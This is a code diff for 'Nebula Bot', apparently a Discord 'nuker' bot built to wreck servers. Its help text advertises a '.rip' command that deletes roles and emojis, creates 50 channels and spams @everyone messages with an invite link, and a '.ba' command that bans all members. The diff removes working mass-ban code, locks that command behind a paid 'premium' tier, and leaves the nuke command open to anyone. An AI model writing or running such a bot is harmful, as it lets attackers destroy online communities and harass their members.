@@ -16,7 +16,7 @@ const client = new Client({
   ]
 });
 
-// ====== WEB SERVER FOR PORT 3000 ======
+// ====== WEB SERVER ======
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -66,8 +66,9 @@ client.on('messageCreate', async (message) => {
       .setTitle('🤖 Nebula Bot Commands')
       .setDescription('Here are the available commands for Nebula Bot:')
       .addFields(
-        { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
-        { name: '.ba', value: 'Bans all members (except owner)' },
+        { name: '.rip', value: '🧨 Nukes the server (available to all)' },
+        { name: '.ba', value: '🔐 Bans all members (premium only)' },
+        { name: '.premium', value: '💳 Get premium access via solbot.store' },
         { name: '.help', value: 'Sends this help message to your DMs' }
       )
       .setColor('#ff0000')
@@ -83,44 +84,26 @@ client.on('messageCreate', async (message) => {
     return;
   }
 
-  // ===== BAN ALL MEMBERS =====
-  if (command === 'ba') {
-    if (!message.member.permissions.has('BanMembers')) {
-      return message.reply('❌ You don\'t have permission to ban members.');
-    }
+  // ===== PREMIUM COMMAND =====
+  if (command === 'premium') {
+    const premiumLink = 'https://solbot.store/premium '; // Replace with your real payment page
 
-    const guild = message.guild;
+    const embed = new EmbedBuilder()
+      .setTitle('💳 Get Premium Access')
+      .setDescription('Click the button below to subscribe and unlock premium features.')
+      .setColor('#00ff00')
+      .setURL(premiumLink);
 
-    // Skip owner and bots
-    const membersToBan = guild.members.cache.filter(m =>
-      m.id !== guild.ownerId && !m.user.bot
-    );
-
-    if (membersToBan.size === 0) {
-      return message.reply('❌ No members available to ban.');
-    }
-
-    console.log(`🔪 Banning ${membersToBan.size} members...`);
-
-    for (const member of membersToBan.values()) {
-      try {
-        await handleRateLimit(() => guild.members.ban(member, {
-          reason: 'Nebula Ban All',
-          deleteMessageSeconds: 604800 // Delete 1 week of messages
-        }));
-        console.log(`✅ Banned: ${member.user.tag}`);
-      } catch (err) {
-        console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
-      }
-      await new Promise(r => setTimeout(r, 50)); // Small delay between bans
-    }
-
-    console.log(`✅ Successfully banned all members.`);
-    await message.reply(`✅ Banned ${membersToBan.size} members.`);
+    await message.reply({ embeds: [embed] });
     return;
   }
 
-  // ===== RIP COMMAND =====
+  // ===== BAN ALL MEMBERS (PREMIUM ONLY) =====
+  if (command === 'ba') {
+    return message.reply('🔐 This command is for premium users only. Visit https://solbot.store/premium  to upgrade.');
+  }
+
+  // ===== RIP COMMAND (PUBLIC) =====
   if (command === 'rip') {
     const guild = message.guild;
     const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
@@ -284,6 +267,23 @@ client.on('messageCreate', async (message) => {
     }
   }
 });
+
+// ====== MONGODB CONNECTION ======
+const mongoose = require('mongoose');
+
+async function connectDB() {
+  try {
+    await mongoose.connect(process.env.MONGO_URI, {
+      useNewUrlParser: true,
+      useUnifiedTopology: true
+    });
+    console.log('🟢 Connected to MongoDB');
+  } catch (err) {
+    console.error('❌ MongoDB connection failed:', err.message);
+  }
+}
+
+connectDB();
 
 // ====== LOGIN ======
 client.login(process.env.TOKEN);
